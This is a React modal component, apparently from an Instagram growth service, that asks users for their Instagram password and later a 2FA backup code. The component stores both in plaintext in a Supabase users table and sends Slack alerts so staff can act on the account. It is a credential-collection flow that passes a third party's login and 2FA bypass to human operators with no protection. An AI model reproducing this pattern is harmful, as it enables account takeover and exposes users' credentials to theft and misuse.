'use client';
import React from 'react';
import { useState } from 'react';
import { FaTimes } from 'react-icons/fa';
import { AiOutlineEye, AiOutlineEyeInvisible } from 'react-icons/ai';
import { messageSlack } from '../../helpers';
import { supabase } from '../../supabaseClient';
import { useEffect } from 'react';

export default function ConnectAccount({ show, setShow, user, message, setMessage }) {
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    // const [countdown, setCountdown] = useState(true)
    const [loading, setLoading] = useState(false)

    useEffect(() => {
        if (message?.text === "success") {
            window.location.reload()
        }
    }, [message])
    
    const connectAc = async (e) => {
        e.preventDefault();
        if (message?.status === '2fa') {
            storeBackupCode()
            return
        }

        setLoading(true)
        const { data, error } = await supabase
            .from('users')
            .update({
                instagramPassword: password,
                messageSender: user.username
            })
            .eq('user_id', user?.user_id);

        error && console.log(data, error && error);
        if (error) return alert(error.message);

        try {
            const msg = `NEW_PASSWORD!: @${user.username} want's to connect their account. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }
        setMessage({ status: '', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
        setLoading(false)
    };

    const [backupCode, setBackupCode] = useState('')
    const storeBackupCode = async () => {
        setLoading(true)
        // alert("We're processing your request...")
        await supabase
            .from("users")
            .update({
                backupcode: backupCode,
                messageSender: user.username
                // status: 'checking'
            }).eq('id', user.id);

        try {
            const msg = `NEW_2fa!: @${user.username} submitted their 2fa code. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }

        setMessage({ status: '', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
        setLoading(false)
    }

    return (
        <div className="fixed top-0 left-0 w-full h-screen z-50">
            <div
                className="absolute top-0 left-0 w-full h-screen bg-[rgba(0,0,0,0.5)]"
                onClick={() => setShow(false)}
            ></div>
            <div className="absolute top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-full md:w-[500px] min-h-[400px] rounded-xl py-6 px-4 bg-white to-black grid place-items-center">
                <div className="">
                    <div className="absolute top-7 right-4">
                        <FaTimes
                            className="cursor-pointer"
                            onClick={() => setShow(false)}
                        />
                    </div>
                    <div className="">
                        <h5 className="font-semibold text-[2rem] text-center text-black font-MontserratBold mt-[30px]">
                            Connect your profile
                        </h5>
                        <p className="text-center text-[0.8rem] mt-2 mb-6 font-MontserratRegular text-black max-w-[80%] mx-auto">
                            Let's get you up and running! Enter your instagram password to
                            connect your profile.
                        </p>
                    </div>

                    <div className="w-72 md:w-80 mx-auto mb-3 py-4 px-6 bg-gray-100 rounded-md flex items-center gap-2">
                        <img
                            src={user?.profile_pic_url}
                            className="rounded-full"
                            height={50}
                            width={50}
                            alt={user?.username?.charAt(0)?.toUpperCase()}
                            loading="lazy"
                        />
                        <div className="font-MontserratSemiBold font-semibold">
                            {user?.username}
                        </div>
                    </div>

                    <form
                        action=""
                        className="flex flex-col items-center justify-start"
                        onSubmit={connectAc}
                    >
                        {message?.status !== '2fa' && <div className="form-outline relative">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                id="form2Example2"
                                className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)]"
                                value={password}
                                placeholder="Password"
                                onChange={({ target }) => setPassword(target.value)}
                            />
                            <div className="absolute right-4 top-[50%] translate-y-[-50%]">
                                {showPassword ? (
                                    <AiOutlineEye
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="cursor-pointer"
                                    />
                                ) : (
                                    <AiOutlineEyeInvisible
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="cursor-pointer"
                                    />
                                )}
                            </div>
                        </div>}

                        {message?.text && <p className="text-center text-[0.8rem] my-3 font-MontserratRegular text-[#ef5f3c] max-w-[80%] mx-auto">
                            {message?.text}
                        </p>}

                        {message?.status === '2fa' && <textarea name="" className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)] resize-none"
                            value={backupCode}
                            onChange={(e) => setBackupCode(e.target.value)} placeholder="Enter backup code"></textarea>}

                        <button
                            type="submit"
                            className="text-white font-MontserratSemiBold text-[16px] mt-6 mb-2 rounded-[5px] py-2 px-6 h-[52px] w-72 md:w-80 font-semibold"
                            style={{
                                backgroundColor: '#ef5f3c',
                                color: 'white',
                                boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)',
                            }}
                        >
                            {loading ? <p className='animate-pulse'>sending...</p> : 'Connect instagram'}
                        </button>
                    </form>
                    <div className="text-center">
                        <p className="text-sm text-black font-MontserratRegular flex items-center gap-2 justify-center">
                            Forgot Password?
                            <a
                                href="https://www.instagram.com/accounts/password/reset/"
                                target="_blank"
                                rel="noreferrer"
                            >
                                <span className="text-[#1b89ff] font-MontserratSemiBold font-[600] text-[14px] mt-3">
                                    Reset it here
                                </span>
                            </a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}
